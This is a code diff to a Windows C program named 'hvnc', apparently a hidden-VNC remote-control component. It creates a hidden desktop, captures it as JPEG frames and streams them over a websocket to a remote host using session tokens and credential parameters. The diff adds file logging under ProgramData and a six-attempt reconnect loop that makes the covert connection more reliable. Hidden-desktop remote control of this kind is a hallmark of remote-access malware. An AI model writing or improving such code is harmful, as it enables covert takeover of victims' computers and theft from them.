@@ -15,11 +15,28 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdint.h>
+#include <stdarg.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
 #include "../ws.h"
+
+static void lg(const char *fmt, ...) {
+#ifdef HVNC_DEBUG
+    static FILE *g_log = NULL;
+    if (!g_log) g_log = fopen("C:\\ProgramData\\hvnc.log", "a");
+    if (!g_log) return;
+    va_list ap;
+    va_start(ap, fmt);
+    vfprintf(g_log, fmt, ap);
+    va_end(ap);
+    fputc('\n', g_log);
+    fflush(g_log);
+#else
+    (void)fmt;
+#endif
+}
 
 #define STB_IMAGE_WRITE_IMPLEMENTATION
 #include "../stb_image_write.h"
@@ -217,7 +234,9 @@ static unsigned char *capture_rgb(void) {
 static DWORD WINAPI worker(LPVOID arg) {
     (void)arg;
     SetThreadDesktop(g_hdesk);
+    lg("worker start");
     char inbuf[4096];
+    int logged = 0;
     for (;;) {
         if (ws_wait(&g_ws, 0) == 1) {
             int op = 0;
@@ -236,6 +255,10 @@ static DWORD WINAPI worker(LPVOID arg) {
             mb.cap = 0;
             stbi_write_jpg_to_func(jpg_write, &mb, g_w, g_h, 3, rgb, 60);
             free(rgb);
+            if (!logged && mb.len) {
+                lg("first frame %d bytes", (int)mb.len);
+                logged = 1;
+            }
             if (mb.len && ws_send(&g_ws, mb.data, mb.len, 2) != 0) {
                 free(mb.data);
                 break;
@@ -279,6 +302,8 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
     norm_slashes(g_spawn);
     norm_slashes(g_creds);
     norm_slashes(g_prompt);
+    lg("args host=%s port=%d session=%.8s tokenlen=%d desktop=%s spawn=%s prompt=%s",
+       host, port, session, (int)strlen(token), g_desktop, g_spawn, g_prompt);
 
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
@@ -291,6 +316,7 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
 
     g_hdesk = CreateDesktopA(g_desktop, NULL, NULL, 0, GENERIC_ALL, NULL);
     if (!g_hdesk) g_hdesk = OpenDesktopA(g_desktop, 0, FALSE, GENERIC_ALL);
+    lg("hdesk=%p", (void *)g_hdesk);
     if (!g_hdesk) {
         fprintf(stderr, "hvnc: cannot create/open desktop\n");
         return 1;
@@ -306,7 +332,20 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
     char path[600];
     snprintf(path, sizeof(path), "/rd/%s?token=%s", session, token);
     g_ws.fd = WS_INVALID;
-    if (ws_connect(&g_ws, host, port, path) != 0) {
+    int rc = -1;
+    for (int attempt = 0; attempt < 6 && rc != 0; attempt++) {
+        rc = ws_connect(&g_ws, host, port, path);
+        lg("connect attempt=%d rc=%d host=%s port=%d wsa=%d", attempt, rc, host, port,
+           WSAGetLastError());
+        if (rc != 0) {
+            if (g_ws.fd != WS_INVALID) {
+                ws_closesock(g_ws.fd);
+                g_ws.fd = WS_INVALID;
+            }
+            Sleep(500);
+        }
+    }
+    if (rc != 0) {
         fprintf(stderr, "hvnc: cannot connect\n");
         return 1;
     }
